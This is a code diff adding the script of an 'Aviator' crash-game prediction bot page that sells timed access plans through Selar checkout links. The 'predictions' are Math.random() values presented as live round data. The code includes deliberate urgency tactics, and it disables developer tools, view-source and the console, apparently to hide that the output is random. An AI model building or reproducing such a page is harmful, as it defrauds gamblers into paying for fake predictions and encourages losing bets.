+                    botActivated = false;
+                    isActivated = false;
+                    document.getElementById('predictionDisplay').classList.add('prediction-blurred');
+                    document.getElementById('gameStartBtn').textContent = 'Activate Bot';
+                    document.getElementById('gameStartBtn').style.display = 'block';  // Ensure button is visible
+                    document.getElementById('gameStatus').textContent = '⏰ Token Expired - Activate Bot to Continue Getting Predictions!';
+
+                    // Reset button onclick to show activation options
+                    document.getElementById('gameStartBtn').onclick = function() {
+                        showActivationOptions();
+                    };
+                    
+                    // Restart auto simulation with blurred predictions
+                    startAutoSimulation();
+                    // Start constant multiplier update for urgency
+                    startConstantMultiplierUpdate();
+                    clearInterval(timer);
+                    return;
+                }
+                
+                const timeLeft = activationEndTime - Date.now();
+                const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                
+                if (hours > 0) {
+                    document.getElementById('gameStatus').innerHTML = `
+                        ✅ Bot Active | Time Left: ${hours}h ${minutes}m ${seconds}s
+                    `;
+                } else if (minutes > 0) {
+                    document.getElementById('gameStatus').innerHTML = `
+                        ✅ Bot Active | Time Left: ${minutes}m ${seconds}s
+                    `;
+                } else {
+                    document.getElementById('gameStatus').innerHTML = `
+                        ✅ Bot Active | Time Left: ${seconds}s
+                    `;
+                }
+            }, 1000);
+        }
+
+        // Payment Modal Functions
+        function showPaymentModal() {
+            if (!selectedPlan) return;
+            
+            console.log('🔄 Opening payment modal and closing activation overlay');
+            
+            // Close activation card when payment modal opens
+            const activationOverlay = document.getElementById('activationOverlay');
+            if (activationOverlay) {
+                activationOverlay.style.display = 'none';
+                activationOverlay.classList.add('hidden');
+                console.log('✅ Activation overlay hidden');
+            } else {
+                console.error('❌ Activation overlay not found');
+            }
+            
+            // Update payment modal with selected plan details
+            document.getElementById('paymentPlanName').textContent = selectedPlan.duration + ' Access';
+            document.getElementById('paymentPlanPrice').textContent = '$' + selectedPlan.price;
+            
+            // Show the payment modal
+            document.getElementById('paymentModal').classList.remove('hidden');
+            
+            console.log('Payment modal opened with plan:', selectedPlan);
+        }
+
+        function closePaymentModal() {
+            document.getElementById('paymentModal').classList.add('hidden');
+            
+            // Reset form
+            document.getElementById('paymentForm').reset();
+            
+            console.log('Payment modal closed and reset');
+        }
+
+        // Handle Complete Payment button click - with null check
+        const completePaymentBtn = document.getElementById('completePaymentBtn');
+        if (completePaymentBtn) {
+            completePaymentBtn.addEventListener('click', async function() {
+                const btn = this;
+                const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+                const packageName = `${selectedPlan.duration} Access`;
+                
+                // Show loading state
+                btn.disabled = true;
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting to Checkout...';
+                
+                // Get Selar link for current plan
+                const selarLinks = {
+                    '30min': 'https://selar.com/257r71m8jq',
+                    '1hour': 'https://selar.com/727771n8q8', 
+                    '3hours': 'https://selar.com/7z65psg003',
+                    '6hours': 'https://selar.com/5733769561',
+                    '24hour': 'https://selar.com/2w191k1kl7',
+                    '72hour': 'https://selar.com/23l421lgif'
+                };
+                const selarLink = selarLinks[selectedPlan.plan] || 'https://selar.com/m/jordan-baker1294382';
+                
+                try {
+                    // Send simple Selar notification
+                    await sendSelarNotification(userContact, packageName);
+                } catch (error) {
+                    console.error('Failed to send notification:', error);
+                }
+                
+                // Redirect to Selar checkout
+                setTimeout(() => {
+                    window.open(selarLink, '_blank');
+                    
+                    // Reset button
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fas fa-external-link-alt"></i> Complete Payment via Selar';
+                    
+                    // Close payment modal
+                    closePaymentModal();
+                    
+                    // Show verification message
+                    alert('Payment window opened! Complete your payment in the new tab, then return here and click "I\'ve Sent Payment" for verification.');
+                    
+                    // Add verification button to activation overlay
+                    showVerificationButton();
+                }, 1000);
+            });
+        }
+
+        // Handle activate bot button click - for manual verification using Selar system (with null check)
+        const activateBotBtn = document.getElementById('activateBotBtn');
+        if (activateBotBtn) {
+            activateBotBtn.addEventListener('click', async function() {
+            const btn = this;
+            const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+            
+            // Show modern loading state
+            btn.disabled = true;
+            btn.innerHTML = `
+                <span style="
+                    width: 16px; 
+                    height: 16px; 
+                    border: 2px solid #f3f3f3; 
+                    border-top: 2px solid #f1c40f; 
+                    border-radius: 50%; 
+                    animation: spin 1s linear infinite; 
+                    display: inline-block; 
+                    margin-right: 8px;
+                "></span>
+                Verifying with System...
+            `;
+            
+            try {
+                // Generate a reference ID for this bot activation request
+                const reference = 'BOT_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                
+                // First create the Selar order in backend for bot access
+                const createResponse = await fetch(`${API_BASE_URL}/api/payments/selar/create-order`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: userContact,
+                        packageName: `${selectedPlan.duration} Bot Access`,
+                        timeSlot: 'Immediate',
+                        bettingSite: 'Bot Platform'
+                    })
+                });
+                
+                const createResult = await createResponse.json();
+                
+                if (!createResult.reference) {
+                    throw new Error('Failed to create bot activation order');
+                }
+                
+                // Now request verification from system
+                const verifyResponse = await fetch(`${API_BASE_URL}/api/payments/selar/verify/${createResult.reference}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                const verifyResult = await verifyResponse.json();
+                
+                // Close payment modal
+                closePaymentModal();
+                
+                if (verifyResult.success) {
+                    // Show verification pending modal with modern UI
+                    showBotVerificationPending(createResult.reference);
+                    
+                } else {
+                    // Verification request failed - show error
+                    showVerificationError('Failed to send verification request');
+                }
+                
+            } catch (error) {
+                console.error('Bot activation verification error:', error);
+                showVerificationError('Technical error occurred. Please try again.');
+                
+                // Reset button
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-play"></i> Activate Bot (Payment Sent)';
+            }
+        });
+        }
+
+        // Complete bot activation - called when payment is verified
+        function completeBotActivation() {
+            console.log('Bot activation complete!');
+            
+            // Save activation session data
+            const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+            if (selectedPlan && userContact) {
+                // Determine duration in hours based on plan
+                let durationHours = 24; // Default to 24 hours
+                const planDuration = selectedPlan.duration.toLowerCase();
+                
+                if (planDuration.includes('1 day') || planDuration.includes('24 hour')) {
+                    durationHours = 24;
+                } else if (planDuration.includes('3 day')) {
+                    durationHours = 72;
+                } else if (planDuration.includes('1 week') || planDuration.includes('7 day')) {
+                    durationHours = 168;
+                } else if (planDuration.includes('1 month') || planDuration.includes('30 day')) {
+                    durationHours = 720;
+                }
+                
+                // Save activation to localStorage
+                BotSession.saveActivation(
+                    userContact,
+                    selectedPlan.duration,
+                    new Date().toISOString(),
+                    durationHours
+                );
+                
+                console.log(`✅ Saved bot activation: ${selectedPlan.duration} for ${userContact} (${durationHours}h)`);
+            }
+            
+            // Close any verification modals
+            const modals = document.querySelectorAll('.bot-verification-modal, .payment-modal');
+            modals.forEach(modal => {
+                if (modal.parentNode) {
+                    modal.parentNode.removeChild(modal);
+                }
+            });
+            
+            // Activate bot immediately
+            botActivated = true;
+            isActivated = true;
+            
+            // Close all modals and show game
+            closeAllModals();
+            const overlay = document.getElementById('activationOverlay');
+            if (overlay) { 
+                overlay.style.display = 'none'; 
+                overlay.classList.add('hidden'); 
+            }
+            
+            // Show and activate game
+            document.getElementById('gameModal').classList.remove('hidden');
+            document.body.className = 'game-active-mode';
+            document.body.style.background = 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%)';
+            
+            // Remove blur from predictions
+            const pred = document.getElementById('predictionDisplay');
+            if (pred) pred.classList.remove('prediction-blurred', 'prediction-locked');
+            
+            const btn = document.getElementById('gameStartBtn');
+            if (btn) { 
+                btn.textContent = 'Start New Prediction'; 
+                btn.style.display = 'block'; 
+                
+                // Update button functionality for activated bot
+                btn.onclick = function() {
+                    if (botActivated) {
+                        startNewRound();
+                    } else {
+                        showActivationOptions();
+                    }
+                };
+            }
+            
+            window.scrollTo(0, 0);
+            
+            // Show success message
+            const successMessage = document.createElement('div');
+            successMessage.style.cssText = `
+                position: fixed;
+                top: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: linear-gradient(135deg, #28a745, #20c997);
+                color: white;
+                padding: 15px 25px;
+                border-radius: 8px;
+                text-align: center;
+                z-index: 10000;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+                font-family: Arial, sans-serif;
+            `;
+            
+            successMessage.innerHTML = `
+                <div style="font-size: 16px; font-weight: bold;">🎉 System Verification Complete!</div>
+                <div style="font-size: 14px; opacity: 0.9; margin-top: 5px;">Bot access activated successfully</div>
+            `;
+            
+            document.body.appendChild(successMessage);
+            
+            // Update game status to show system activation
+            const gameStatus = document.getElementById('gameStatus');
+            if (gameStatus) {
+                gameStatus.textContent = '✅ System Activated | Premium Access Unlocked';
+            }
+            
+            // Start the bot automatically after activation
+            setTimeout(() => {
+                if (typeof startNewRound === 'function') {
+                    startNewRound();
+                }
+            }, 1000);
+            
+            // Auto-remove success message after 5 seconds
+            setTimeout(() => {
+                if (successMessage.parentNode) {
+                    successMessage.remove();
+                }
+            }, 5000);
+        }
+
+        // Show verification error
+        function showVerificationError(message) {
+            const errorElement = document.createElement('div');
+            errorElement.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: linear-gradient(135deg, #dc3545, #c82333);
+                color: white;
+                padding: 25px;
+                border-radius: 12px;
+                text-align: center;
+                z-index: 10000;
+                box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+                max-width: 350px;
+                font-family: Arial, sans-serif;
+            `;
+            
+            errorElement.innerHTML = `
+                <div style="font-size: 36px; margin-bottom: 15px;">❌</div>
+                <h3 style="margin: 0 0 10px 0; color: white;">Verification Failed</h3>
+                <p style="margin: 0; opacity: 0.9;">${message}</p>
+                <button onclick="this.parentElement.remove();" style="
+                    background: rgba(255,255,255,0.2);
+                    border: 1px solid rgba(255,255,255,0.3);
+                    color: white;
+                    padding: 8px 16px;
+                    border-radius: 5px;
+                    margin-top: 15px;
+                    cursor: pointer;
+                ">Close</button>
+            `;
+            
+            document.body.appendChild(errorElement);
+            
+            // Auto-remove after 4 seconds
+            setTimeout(() => {
+                if (errorElement.parentNode) {
+                    errorElement.remove();
+                }
+            }, 4000);
+        }
+
+        // Payment success handler for bot.html
+        window.handlePaymentSuccess = function() {
+            console.log('Bot payment success handler called');
+            
+            // Close payment modal if it exists
+            const paymentModal = document.querySelector('.payment-modal, #payment-modal');
+            if (paymentModal) {
+                paymentModal.remove();
+            }
+            
+            // Call bot activation completion
+            completeBotActivation();
+        };
+
+        // Show bot verification pending modal with modern UI and status checking
+        function showBotVerificationPending(reference) {
+            const modalHTML = `
+                <div class="bot-verification-modal" style="
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0, 0, 0, 0.8);
+                    z-index: 10000;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                ">
+                    <div style="
+                        background: linear-gradient(135deg, #1a1a2e, #16213e);
+                        padding: 40px;
+                        border-radius: 15px;
+                        max-width: 500px;
+                        width: 90%;
+                        border: 2px solid #f1c40f;
+                        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+                        text-align: center;
+                        position: relative;
+                    ">
+                        <span class="close-verification" style="
+                            position: absolute;
+                            top: 15px;
+                            right: 20px;
+                            font-size: 28px;
+                            color: #f1c40f;
+                            cursor: pointer;
+                            font-weight: bold;
+                        ">&times;</span>
+                        
+                        <div style="font-size: 64px; color: #f1c40f; margin-bottom: 20px;">⏳</div>
+                        <h3 style="color: #f1c40f; margin-bottom: 15px;">Bot Verification Sent</h3>
+                        
+                        <div class="verification-status" style="margin: 20px 0;">
+                            <div style="
+                                width: 40px; 
+                                height: 40px; 
+                                border: 4px solid #333; 
+                                border-top: 4px solid #f1c40f; 
+                                border-radius: 50%; 
+                                animation: spin 1s linear infinite; 
+                                margin: 0 auto 15px;
+                            "></div>
+                            <p style="color: #ccc; font-size: 16px; margin: 15px 0; line-height: 1.5;">
+                                Your bot activation request is being processed by our system.<br>
+                                <strong style="color: #f1c40f;">Reference:</strong> ${reference}
+                            </p>
+                            <p style="color: #888; font-size: 14px; margin: 10px 0;">
+                                Please wait while we verify your payment...
+                            </p>
+                        </div>
+                        
+                        <div style="
+                            background: rgba(241, 196, 15, 0.1);
+                            padding: 20px;
+                            border-radius: 8px;
+                            margin: 20px 0;
+                            border: 1px solid rgba(241, 196, 15, 0.3);
+                        ">
+                            <h5 style="color: #f1c40f; margin: 0 0 10px 0;">📋 Activation Summary</h5>
+                            <p style="color: #ccc; margin: 5px 0;">🤖 Package: ${selectedPlan.duration} Bot Access</p>
+                            <p style="color: #ccc; margin: 5px 0;">💵 Amount: $${selectedPlan.price}</p>
+                            <p style="color: #ccc; margin: 5px 0;">🆔 Order: ${reference}</p>
+                        </div>
+                        
+                        <div style="margin-top: 25px;">
+                            <button onclick="checkBotPaymentStatus('${reference}')" style="
+                                background: #f1c40f;
+                                color: #1a1a2e;
+                                border: none;
+                                padding: 12px 24px;
+                                border-radius: 6px;
+                                cursor: pointer;
+                                margin: 5px;
+                                font-weight: bold;
+                                font-size: 14px;
+                            ">Check Status</button>
+                            <a href="https://t.me/Aadmin4cnc" target="_blank" style="
+                                display: inline-block;
+                                background: #0088cc;
+                                color: white;
+                                text-decoration: none;
+                                padding: 12px 24px;
+                                border-radius: 6px;
+                                margin: 5px;
+                                font-size: 14px;
+                            ">Contact Support</a>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            document.body.insertAdjacentHTML('beforeend', modalHTML);
+            
+            // Auto-check status every 5 seconds
+            const statusInterval = setInterval(async () => {
+                try {
+                    const statusResponse = await fetch(`${API_BASE_URL}/api/payments/selar/status/${reference}`);
+                    const statusResult = await statusResponse.json();
+                    
+                    if (statusResult.status === 'verified') {
+                        clearInterval(statusInterval);
+                        document.querySelector('.bot-verification-modal').remove();
+                        completeBotActivation();
+                    } else if (statusResult.status === 'rejected') {
+                        clearInterval(statusInterval);
+                        document.querySelector('.verification-status').innerHTML = `
+                            <h4 style="color:#e74c3c;">❌ Bot Activation Rejected</h4>
+                            <p style="color:#888;margin:15px 0;">Your payment could not be verified. Please contact support or try again.</p>
+                        `;
+                    }
+                } catch (error) {
+                    console.error('Status check error:', error);
+                }
+            }, 5000);
+            
+            // Close modal handler
+            document.querySelector('.close-verification').onclick = function() {
+                clearInterval(statusInterval);
+                document.querySelector('.bot-verification-modal').remove();
+            };
+            
+            // Store interval ID for cleanup
+            window.botStatusInterval = statusInterval;
+        }
+
+        // Function to check bot payment status manually
+        window.checkBotPaymentStatus = async function(reference) {
+            const statusButton = event.target;
+            const originalText = statusButton.textContent;
+            statusButton.disabled = true;
+            statusButton.innerHTML = `
+                <span style="
+                    width: 14px; 
+                    height: 14px; 
+                    border: 2px solid #1a1a2e; 
+                    border-top: 2px solid #f1c40f; 
+                    border-radius: 50%; 
+                    animation: spin 1s linear infinite; 
+                    display: inline-block; 
+                    margin-right: 5px;
+                "></span>
+                Checking...
+            `;
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/payments/selar/status/${reference}`);
+                const result = await response.json();
+                
+                console.log('Bot payment status check result:', result);
+                
+                if (result.success) {
+                    switch (result.status) {
+                        case 'verified':
+                            // Payment verified - close modal and activate bot
+                            const modal = document.querySelector('.bot-verification-modal');
+                            if (modal) {
+                                modal.remove();
+                            }
+                            
+                            // Call the payment success handler
+                            if (typeof window.handlePaymentSuccess === 'function') {
+                                window.handlePaymentSuccess();
+                            } else {
+                                completeBotActivation();
+                            }
+                            break;
+                            
+                        case 'rejected':
+                            // Payment rejected - show error
+                            const statusDiv = document.querySelector('.verification-status');
+                            if (statusDiv) {
+                                statusDiv.innerHTML = `
+                                    <h4 style="color:#e74c3c;">❌ Bot Activation Rejected</h4>
+                                    <p style="color:#888;margin:15px 0;">Your payment could not be verified. Please contact support or try again.</p>
+                                `;
+                            } else {
+                                showVerificationError('Your payment could not be verified. Please contact support or try again.');
+                            }
+                            break;
+                            
+                        case 'pending_verification':
+                        default:
+                            // Still pending verification
+                            alert('Bot activation is still pending verification. Please wait for system confirmation...');
+                            break;
+                    }
+                } else {
+                    // Error from backend
+                    console.error('Backend error:', result.message);
+                    alert(`Error: ${result.message || 'Unable to check activation status'}`);
+                }
+            } catch (error) {
+                console.error('Status check error:', error);
+                alert('Network error checking activation status. Please check your connection and try again.');
+            } finally {
+                statusButton.disabled = false;
+                statusButton.innerHTML = originalText;
+            }
+        };
+
+        function closeGame() {
+            document.getElementById('gameModal').classList.add('hidden');
+            
+            // Reset body class and style
+            document.body.className = '';
+            document.body.style.background = '';
+            
+            // Stop auto simulation
+            if (autoSimulationInterval) {
+                clearInterval(autoSimulationInterval);
+            }
+            // Reset to site selection
+            document.getElementById('siteSelect').classList.remove('hidden');
+            selectedSite = null;
+            document.querySelectorAll('.site-btn').forEach(b => b.classList.remove('selected'));
+            // Reset game state
+            document.getElementById('roundStatus').textContent = 'Waiting for next round...';
+            document.getElementById('predictionDisplay').textContent = '8.45x';
+            document.getElementById('predictionDisplay').classList.add('prediction-blurred');
+            document.getElementById('roundTimer').textContent = '';
+            document.getElementById('gameStartBtn').style.display = 'block';
+            document.getElementById('gameStartBtn').textContent = 'Unlock Bot Predictions';
+            document.getElementById('activationOverlay').classList.add('hidden');
+            // Reset activation state
+            botActivated = false;
+            isActivated = false;
+            selectedPlan = null;
+            document.querySelectorAll('.price-option').forEach(opt => opt.classList.remove('selected'));
+            document.getElementById('activateBtn').disabled = true;
+            document.getElementById('activateBtn').textContent = 'Select a Plan to Activate';
+        }
+
+        function startNewRound() {
+            console.log('🎮 startNewRound() called');
+            console.log('🤖 botActivated status:', botActivated);
+            
+            if (!botActivated) {
+                console.log('❌ Bot not activated, showing activation options');
+                showActivationOptions();
+                return;
+            }
+            
+            console.log('✅ Bot is activated, starting new round');
+            document.getElementById('gameStartBtn').style.display = 'none';
+            simulateRound();
+        }
+
+        function animateRisingMultiplier(targetValue, callback) {
+            const predictionDisplay = document.getElementById('predictionDisplay');
+            let currentValue = 1.00;
+            const increment = (targetValue - 1.00) / 20; // 20 steps for smooth animation
+            const duration = 100; // 100ms per step for 2 second total
+            
+            // Clear any existing blur classes
+            predictionDisplay.classList.remove('prediction-blurred', 'prediction-locked');
+            predictionDisplay.classList.add('multiplier-rising');
+            
+            const animation = setInterval(() => {
+                currentValue += increment;
+                if (currentValue >= targetValue) {
+                    currentValue = targetValue;
+                    clearInterval(animation);
+                    predictionDisplay.classList.remove('multiplier-rising');
+                    // Execute callback after animation completes
+                    if (callback) {
+                        setTimeout(callback, 500); // Short delay before applying blur
+                    }
+                }
+                predictionDisplay.textContent = currentValue.toFixed(2) + 'x';
+            }, duration);
+        }
+
+        function simulateRound() {
+            let isWaiting = true;
+            
+            function runRound() {
+                const roundStatus = document.getElementById('roundStatus');
+                const predictionDisplay = document.getElementById('predictionDisplay');
+                const roundTimer = document.getElementById('roundTimer');
+                
+                if (isWaiting && botActivated) {
+                    // Waiting phase
+                    roundStatus.textContent = 'Staging live Environment...';
+                    predictionDisplay.textContent = '--';
+                    roundTimer.textContent = 'Preparing...';
+                    
+                    setTimeout(() => {
+                        if (!botActivated) return; // Check if still activated
+                        // Starting phase
+                        roundStatus.textContent = 'Collecting Next Round...';
+                        roundTimer.textContent = 'Fetching in 3...2...1...';
+                        
+                        setTimeout(() => {
+                            if (!botActivated) return; // Check if still activated
+                            // Active round with prediction
+                            let prediction;
+                            
+                            // For the first demo round, ensure multiplier is less than 4
+                            if (window.isFirstDemoRound) {
+                                prediction = (Math.random() * 2.5 + 1.5).toFixed(2); // 1.5 to 4.0
+                                window.isFirstDemoRound = false; // Reset flag after first use
+                            } else {
+                                prediction = (Math.random() * 8 + 1.5).toFixed(2); // Normal range: 1.5 to 9.5
+                            }
+                            
+                            roundStatus.textContent = 'Plane Flies...';
+
+                            // Always show rising multiplier animation first
+                            animateRisingMultiplier(parseFloat(prediction), () => {
+                                // After animation completes, apply blur if not activated
+                                if (!isActivated) {
+                                    predictionDisplay.classList.add('prediction-blurred', 'prediction-locked');
+                                }
+                            });
+                            
+                            roundTimer.textContent = 'Place your bet now!';
+                            
+                            setTimeout(() => {
+                                if (!botActivated) return; // Check if still activated
+                                // Round ending
+                                roundStatus.textContent = 'Round Completed';
+                                roundTimer.textContent = `Result: ${prediction}x`;
+                                
+                                setTimeout(() => {
+                                    if (botActivated) {
+                                        document.getElementById('gameStartBtn').style.display = 'block';
+                                        roundStatus.textContent = 'Ready for next prediction';
+                                        predictionDisplay.textContent = '--';
+                                        roundTimer.textContent = 'Click Start Prediction for next round';
+                                    }
+                                }, 3000);
+                            }, 8000);
+                        }, 3000);
+                    }, 4000);
+                }
+            }
+            
+            runRound();
+        }
+
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            // F12
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+I (Developer Tools)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+J (Console)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U (View Source)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+C (Element Inspector)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Disable drag and drop
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Disable text selection on double click
+        document.addEventListener('selectstart', function(e) {
+            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Clear console periodically
+        setInterval(() => {
+            console.clear();
+        }, 60000);
+
+        
+        // Logout function with backend notification
+        function logoutUser() {
+            if (confirm('Are you sure you want to logout? You will need to login again next time.')) {
+                const contact = sessionStorage.getItem('aviator_contact');
+                
+                // Send logout notification to backend
+                if (contact) {
+                    fetch(`${API_BASE_URL}/api/auth/logout`, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ 
+                            contact: contact,
+                            timestamp: new Date().toISOString()
+                        }),
+                    }).catch(error => {
+                        console.warn('⚠️ Failed to send logout notification:', error);
+                    });
+                }
+                
+                // Clear all session data
+                clearUserSession();
+                
+                // Show logout message
+                const logoutMsg = document.createElement('div');
+                logoutMsg.style.cssText = `
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    background: #dc3545;
+                    color: white;
+                    padding: 15px 20px;
+                    border-radius: 8px;
+                    z-index: 10000;
+                    font-size: 14px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+                `;
+                logoutMsg.innerHTML = `
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-sign-out-alt"></i>
+                        <span>Logged out successfully!</span>
+                    </div>
+                `;
+                document.body.appendChild(logoutMsg);
+                
+                // Redirect to login after 2 seconds
+                setTimeout(() => {
+                    window.location.reload();
+                }, 2000);
+            }
+        }
+    </script>
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    
+    // Add error handling for Tawk.to
+    Tawk_API.onLoad = function(){
+        console.log('Tawk.to chat widget loaded successfully');
+    };
+    
+    // Handle offline scenarios
+    Tawk_API.onOfflineMessage = function(data){
+        console.log('Tawk.to offline message:', data);
+    };
+    
+    (function(){
+        try {
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src='https://embed.tawk.to/68a240334ebc491927e09906/1j2ssljfv';
+            s1.charset='UTF-8';
+            s1.setAttribute('crossorigin','*');
+            
+            // Error handling for script loading
+            s1.onerror = function() {
+                console.warn('Tawk.to chat widget failed to load. Please check your internet connection.');
+            };
+            
+            s0.parentNode.insertBefore(s1,s0);
+        } catch (error) {
+            console.warn('Error loading Tawk.to widget:', error);
+        }
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+    
+    <script>
+    </script>
+
+</body>
+</html>
